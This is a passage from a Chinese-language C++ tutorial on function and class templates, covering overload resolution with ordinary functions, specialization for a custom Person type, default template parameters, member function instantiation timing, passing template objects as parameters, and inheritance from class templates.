<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//普通函数与函数模板调用规则</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myPrint</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;调用的普通函数&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myPrint</span><span class="params">(T a, T b)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;调用的模板&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myPrint</span><span class="params">(T a, T b, T c)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;调用重载的模板&quot;</span> &lt;&lt; endl; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//1、如果函数模板和普通函数都可以实现，优先调用普通函数</span></span><br><span class="line">	<span class="comment">// 注意 如果告诉编译器  普通函数是有的，但只是声明没有实现，或者不在当前文件内实现，就会报错找不到</span></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">20</span>;</span><br><span class="line">	<span class="built_in">myPrint</span>(a, b); <span class="comment">//调用普通函数</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//2、可以通过空模板参数列表来强制调用函数模板</span></span><br><span class="line">	myPrint&lt;&gt;(a, b); <span class="comment">//调用函数模板</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//3、函数模板也可以发生重载</span></span><br><span class="line">	<span class="type">int</span> c = <span class="number">30</span>;</span><br><span class="line">	<span class="built_in">myPrint</span>(a, b, c); <span class="comment">//调用重载的函数模板</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//4、 如果函数模板可以产生更好的匹配,优先调用函数模板</span></span><br><span class="line">	<span class="type">char</span> c1 = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">	<span class="type">char</span> c2 = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">	<span class="built_in">myPrint</span>(c1, c2); <span class="comment">//调用函数模板</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：既然提供了函数模板，最好就不要提供普通函数，否则容易出现二义性</p>
<h4 id="1-2-6-模板的局限性"><a href="#1-2-6-模板的局限性" class="headerlink" title="1.2.6 模板的局限性"></a>1.2.6 模板的局限性</h4><p><strong>局限性：</strong></p>
<ul>
<li>模板的通用性并不是万能的</li>
</ul>
<p><strong>例如：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">(T a, T b)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">   	a = b;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>在上述代码中提供的赋值操作，如果传入的a和b是一个数组，就无法实现了</p>
<p>再例如：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">(T a, T b)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">   	<span class="keyword">if</span>(a &gt; b) &#123; ... &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>在上述代码中，如果T的数据类型传入的是像Person这样的自定义数据类型，也无法正常运行</p>
<p>因此C++为了解决这种问题，提供模板的重载，可以为这些<strong>特定的类型</strong>提供<strong>具体化的模板</strong></p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>(string name, <span class="type">int</span> age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Name = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Age = age;</span><br><span class="line">	&#125;</span><br><span class="line">	string m_Name;</span><br><span class="line">	<span class="type">int</span> m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//普通函数模板</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">myCompare</span><span class="params">(T&amp; a, T&amp; b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (a == b)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//具体化，显示具体化的原型和定意思以template&lt;&gt;开头，并通过名称来指出类型</span></span><br><span class="line"><span class="comment">//具体化优先于常规模板</span></span><br><span class="line"><span class="keyword">template</span>&lt;&gt; <span class="function"><span class="type">bool</span> <span class="title">myCompare</span><span class="params">(Person &amp;p1, Person &amp;p2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ( p<span class="number">1.</span>m_Name  == p<span class="number">2.</span>m_Name &amp;&amp; p<span class="number">1.</span>m_Age == p<span class="number">2.</span>m_Age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">20</span>;</span><br><span class="line">	<span class="comment">//内置数据类型可以直接使用通用的函数模板</span></span><br><span class="line">	<span class="type">bool</span> ret = <span class="built_in">myCompare</span>(a, b);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;a == b &quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;a != b &quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="string">&quot;Tom&quot;</span>, <span class="number">10</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p2</span><span class="params">(<span class="string">&quot;Tom&quot;</span>, <span class="number">10</span>)</span></span>;</span><br><span class="line">	<span class="comment">//自定义数据类型，不会调用普通的函数模板</span></span><br><span class="line">	<span class="comment">//可以创建具体化的Person数据类型的模板，用于特殊处理这个类型</span></span><br><span class="line">	<span class="type">bool</span> ret = <span class="built_in">myCompare</span>(p1, p2);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;p1 == p2 &quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;p1 != p2 &quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test02</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>利用具体化的模板，可以解决自定义类型的通用化</li>
<li>学习模板并不是为了写模板，而是在STL能够运用系统提供的模板</li>
</ul>
<h3 id="1-3-类模板"><a href="#1-3-类模板" class="headerlink" title="1.3 类模板"></a>1.3 类模板</h3><h4 id="1-3-1-类模板语法"><a href="#1-3-1-类模板语法" class="headerlink" title="1.3.1 类模板语法"></a>1.3.1 类模板语法</h4><p>类模板作用：</p>
<ul>
<li>建立一个通用类，类中的成员 数据类型可以不具体制定，用一个<strong>虚拟的类型</strong>来代表。</li>
</ul>
<p><strong>语法：</strong> </p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">类</span><br></pre></td></tr></table></figure></div>

<p><strong>解释：</strong></p>
<p>template  —  声明创建模板</p>
<p>typename  — 表面其后面的符号是一种数据类型，可以用class代替</p>
<p>T    —   通用的数据类型，名称可以替换，通常为大写字母</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="comment">//类模板</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">NameType</span>, <span class="keyword">class</span> <span class="title class_">AgeType</span>&gt; </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>(NameType name, AgeType age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;mName = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;mAge = age;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">showPerson</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;name: &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;mName &lt;&lt; <span class="string">&quot; age: &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;mAge &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	NameType mName;</span><br><span class="line">	AgeType mAge;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 指定NameType 为string类型，AgeType 为 int类型</span></span><br><span class="line">	Person&lt;string, <span class="type">int</span>&gt;<span class="built_in">P1</span>(<span class="string">&quot;孙悟空&quot;</span>, <span class="number">999</span>);</span><br><span class="line">	P<span class="number">1.</span><span class="built_in">showPerson</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：类模板和函数模板语法相似，在声明模板template后面加类，此类称为类模板</p>
<h4 id="1-3-2-类模板与函数模板区别"><a href="#1-3-2-类模板与函数模板区别" class="headerlink" title="1.3.2 类模板与函数模板区别"></a>1.3.2 类模板与函数模板区别</h4><p>类模板与函数模板区别主要有两点：</p>
<ol>
<li>类模板没有自动类型推导的使用方式</li>
<li>类模板在模板参数列表中可以有默认参数</li>
</ol>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="comment">//类模板</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">NameType</span>, <span class="keyword">class</span> <span class="title class_">AgeType</span> = <span class="type">int</span>&gt; </span><br><span class="line"><span class="keyword">class</span> Person</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>(NameType name, AgeType age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;mName = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;mAge = age;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">showPerson</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;name: &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;mName &lt;&lt; <span class="string">&quot; age: &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;mAge &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	NameType mName;</span><br><span class="line">	AgeType mAge;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1、类模板没有自动类型推导的使用方式</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// Person p(&quot;孙悟空&quot;, 1000); // 错误 类模板使用时候，不可以用自动类型推导</span></span><br><span class="line">	Person &lt;string ,<span class="type">int</span>&gt;<span class="built_in">p</span>(<span class="string">&quot;孙悟空&quot;</span>, <span class="number">1000</span>); <span class="comment">//必须使用显示指定类型的方式，使用类模板</span></span><br><span class="line">	p.<span class="built_in">showPerson</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2、类模板在模板参数列表中可以有默认参数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Person &lt;string&gt; <span class="built_in">p</span>(<span class="string">&quot;猪八戒&quot;</span>, <span class="number">999</span>); <span class="comment">//类模板中的模板参数列表 可以指定默认参数</span></span><br><span class="line">	p.<span class="built_in">showPerson</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test02</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>类模板使用只能用显示指定类型方式</li>
<li>类模板中的模板参数列表可以有默认参数</li>
</ul>
<h4 id="1-3-3-类模板中成员函数创建时机"><a href="#1-3-3-类模板中成员函数创建时机" class="headerlink" title="1.3.3 类模板中成员函数创建时机"></a>1.3.3 类模板中成员函数创建时机</h4><p>类模板中成员函数和普通类中成员函数创建时机是有区别的：</p>
<ul>
<li>普通类中的成员函数一开始就可以创建</li>
<li>类模板中的成员函数在调用时才创建</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person1</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">showPerson1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Person1 show&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person2</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">showPerson2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Person2 show&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	T obj;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//类模板中的成员函数，并不是一开始就创建的，而是在模板调用时再生成</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">fun1</span><span class="params">()</span> </span>&#123; obj.<span class="built_in">showPerson1</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">fun2</span><span class="params">()</span> </span>&#123; obj.<span class="built_in">showPerson2</span>(); &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	MyClass&lt;Person1&gt; m;</span><br><span class="line">	</span><br><span class="line">	m.<span class="built_in">fun1</span>();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//m.fun2();//编译会出错，说明函数调用才会去创建成员函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：类模板中的成员函数并不是一开始就创建的，在调用时才去创建</p>
<h4 id="1-3-4-类模板对象做函数参数"><a href="#1-3-4-类模板对象做函数参数" class="headerlink" title="1.3.4 类模板对象做函数参数"></a>1.3.4 类模板对象做函数参数</h4><p>学习目标：</p>
<ul>
<li>类模板实例化出的对象，向函数传参的方式</li>
</ul>
<p>一共有三种传入方式：</p>
<ol>
<li>指定传入的类型   — 直接显示对象的数据类型</li>
<li>参数模板化           — 将对象中的参数变为模板进行传递</li>
<li>整个类模板化       — 将这个对象类型 模板化进行传递</li>
</ol>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="comment">//类模板</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">NameType</span>, <span class="keyword">class</span> <span class="title class_">AgeType</span> = <span class="type">int</span>&gt; </span><br><span class="line"><span class="keyword">class</span> Person</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>(NameType name, AgeType age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;mName = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;mAge = age;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">showPerson</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;name: &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;mName &lt;&lt; <span class="string">&quot; age: &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;mAge &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	NameType mName;</span><br><span class="line">	AgeType mAge;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1、指定传入的类型</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printPerson1</span><span class="params">(Person&lt;string, <span class="type">int</span>&gt; &amp;p)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	p.<span class="built_in">showPerson</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Person &lt;string, <span class="type">int</span> &gt;<span class="built_in">p</span>(<span class="string">&quot;孙悟空&quot;</span>, <span class="number">100</span>);</span><br><span class="line">	<span class="built_in">printPerson1</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2、参数模板化</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T1</span>, <span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printPerson2</span><span class="params">(Person&lt;T1, T2&gt;&amp;p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	p.<span class="built_in">showPerson</span>();</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;T1的类型为： &quot;</span> &lt;&lt; <span class="built_in">typeid</span>(T1).<span class="built_in">name</span>() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;T2的类型为： &quot;</span> &lt;&lt; <span class="built_in">typeid</span>(T2).<span class="built_in">name</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Person &lt;string, <span class="type">int</span> &gt;<span class="built_in">p</span>(<span class="string">&quot;猪八戒&quot;</span>, <span class="number">90</span>);</span><br><span class="line">	<span class="built_in">printPerson2</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3、整个类模板化</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printPerson3</span><span class="params">(T &amp; p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;T的类型为： &quot;</span> &lt;&lt; <span class="built_in">typeid</span>(T).<span class="built_in">name</span>() &lt;&lt; endl;</span><br><span class="line">	p.<span class="built_in">showPerson</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test03</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Person &lt;string, <span class="type">int</span> &gt;<span class="built_in">p</span>(<span class="string">&quot;唐僧&quot;</span>, <span class="number">30</span>);</span><br><span class="line">	<span class="built_in">printPerson3</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line">	<span class="built_in">test02</span>();</span><br><span class="line">	<span class="built_in">test03</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>通过类模板创建的对象，可以有三种方式向函数中进行传参</li>
<li>使用比较广泛是第一种：指定传入的类型</li>
</ul>
<h4 id="1-3-5-类模板与继承"><a href="#1-3-5-类模板与继承" class="headerlink" title="1.3.5 类模板与继承"></a>1.3.5 类模板与继承</h4><p>当类模板碰到继承时，需要注意一下几点：</p>
<ul>
<li>当子类继承的父类是一个类模板时，子类在声明的时候，要指定出父类中T的类型</li>
<li>如果不指定，编译器无法给子类分配内存</li>
<li>如果想灵活指定出父类中T的类型，子类也需变为类模板</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span></span><br><span class="line">&#123;</span><br><span class="line">	T m;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//class Son:public Base  //错误，c++编译需要给子类分配内存，必须知道父类中T的类型才可以向下继承</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> :<span class="keyword">public</span> Base&lt;<span class="type">int</span>&gt; <span class="comment">//必须指定一个类型</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Son c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//类模板继承类模板 ,可以用T2指定父类中的T类型</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T1</span>, <span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son2</span> :<span class="keyword">public</span> Base&lt;T2&gt;</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Son2</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="built_in">typeid</span>(T1).<span class="built_in">name</span>() &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="built_in">typeid</span>(T2).<span class="built_in">name</span>() &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Son2&lt;<span class="type">int</span>, <span class="type">char</span>&gt; child1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test02</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：如果父类是类模板，子类需要指定出父类中T的数据类型</p>
<h4 id="1-3-6-类模板成员函数类外实现"><a href="#1-3-6-类模板成员函数类外实现" class="headerlink" title="1.3.6 类模板成员函数类外实现"></a>1.3.6 类模板成员函数类外实现</h4><p>学习目标：能够掌握类模板中的成员函数类外实现</p>
<p><strong>示例：</strong></p>
